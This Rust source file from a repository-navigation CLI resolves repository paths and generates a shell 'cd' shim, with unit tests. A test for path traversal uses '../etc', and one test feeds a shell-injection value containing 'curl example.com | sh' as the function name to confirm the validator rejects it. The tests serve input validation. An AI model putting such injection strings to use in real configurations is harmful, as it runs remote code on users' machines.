use std::path::{Component, Path, PathBuf};

use crate::config::{Config, ConfigSupport, validate_cd_shim_name};
use crate::mure_error::Error;

pub fn path(config: &Config, name: &str) -> Result<(), Error> {
    println!("{}", resolve(config, name)?.display());
    Ok(())
}

pub fn shell_shims(config: &Config) -> Result<String, Error> {
    let fn_name = config.resolve_cd_shims();
    shell_shims_for_cd_directly("mure", &fn_name)
}

fn shell_shims_for_cd_directly(bin_name: &str, fn_name: &str) -> Result<String, Error> {
    validate_cd_shim_name(fn_name)?;
    Ok(format!(
        "function {fn_name}() {{ local p=$({bin_name} path \"$1\") && cd \"$p\" }}\n"
    ))
}

fn validate_name(name: &str) -> Result<(), Error> {
    let path = Path::new(name);
    if path.is_absolute() || path.components().any(|c| c == Component::ParentDir) {
        return Err(Error::from_str(
            "repository name must be a simple relative name (no absolute path or '..')",
        ));
    }
    Ok(())
}

pub(crate) fn resolve(config: &Config, name: &str) -> Result<PathBuf, Error> {
    validate_name(name)?;
    let path_ = config.base_path().join(name);
    if path_.is_dir() && path_.exists() {
        return Ok(path_);
    }
    crate::app::list::find_mure_repo(config, name).map(|repo| repo.relative_path)
}

#[cfg(test)]
mod tests {
    use crate::config::{Core, GitHub, Shell};
    use mktemp::Temp;

    use super::*;

    #[test]
    fn test_resolve_path() {
        let temp = Temp::new_dir().unwrap();
        let config = Config {
            core: Core {
                base_dir: temp.as_path().to_str().unwrap().to_string(),
                editor: None,
            },
            github: GitHub {
                username: "".to_string(),
                query: None,
                queries: None,
            },
            shell: Some(Shell {
                cd_shims: Some("mucd".to_string()),
            }),
        };
        git2::Repository::init(config.base_path().join("test_repo")).unwrap();
        let path = resolve(&config, "test_repo").unwrap();
        assert_eq!(
            path.to_str().unwrap(),
            temp.as_path().join("test_repo").to_str().unwrap()
        );

        // test_repo2 not exist
        let path2 = resolve(&config, "test_repo2");
        assert!(path2.is_err());
        assert!(
            path2
                .unwrap_err()
                .to_string()
                .ends_with("test_repo2 is not a git repository")
        );

        // absolute path must be rejected
        let path3 = resolve(&config, "/etc");
        assert!(path3.is_err());
        assert!(
            path3
                .unwrap_err()
                .to_string()
                .contains("simple relative name")
        );

        // parent dir traversal must be rejected
        let path4 = resolve(&config, "../etc");
        assert!(path4.is_err());
        assert!(
            path4
                .unwrap_err()
                .to_string()
                .contains("simple relative name")
        );
    }

    #[test]
    fn test_resolve_path_finds_nested_work_symlink() {
        let temp = Temp::new_dir().unwrap();
        let config = Config {
            core: Core {
                base_dir: temp.as_path().to_str().unwrap().to_string(),
                editor: None,
            },
            github: GitHub {
                username: "".to_string(),
                query: None,
                queries: None,
            },
            shell: Some(Shell {
                cd_shims: Some("mucd".to_string()),
            }),
        };
        let store = config.repo_store_path("github.com", "owner", "test_repo");
        std::fs::create_dir_all(store.parent().unwrap()).unwrap();
        git2::Repository::init(&store).unwrap();
        let work = config.repo_work_path("github.com", "owner", "test_repo");
        std::fs::create_dir_all(work.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(store, &work).unwrap();

        assert_eq!(resolve(&config, "test_repo").unwrap(), work);
    }

    #[test]
    fn test_shell_shims() {
        let config = Config {
            core: Core {
                base_dir: "".to_string(),
                editor: None,
            },
            github: GitHub {
                username: "".to_string(),
                query: None,
                queries: None,
            },
            shell: Some(Shell {
                cd_shims: Some("mucd".to_string()),
            }),
        };
        let shims = shell_shims(&config);
        assert_eq!(
            shims.unwrap(),
            "function mucd() { local p=$(mure path \"$1\") && cd \"$p\" }\n"
        );
    }

    #[test]
    fn test_shell_shims_rejects_invalid_function_name() {
        let config = Config {
            core: Core {
                base_dir: "".to_string(),
                editor: None,
            },
            github: GitHub {
                username: "".to_string(),
                query: None,
                queries: None,
            },
            shell: Some(Shell {
                cd_shims: Some("mucd\ncurl example.com | sh\nfunction mucd".to_string()),
            }),
        };

        let err = shell_shims(&config).unwrap_err();
        assert!(err.to_string().contains("valid shell function name"));
    }

    #[test]
    fn test_shell_shims_accepts_safe_function_name() {
        let shims = shell_shims_for_cd_directly("mure", "_mucd123").unwrap();
        assert_eq!(
            shims,
            "function _mucd123() { local p=$(mure path \"$1\") && cd \"$p\" }\n"
        );
    }
}
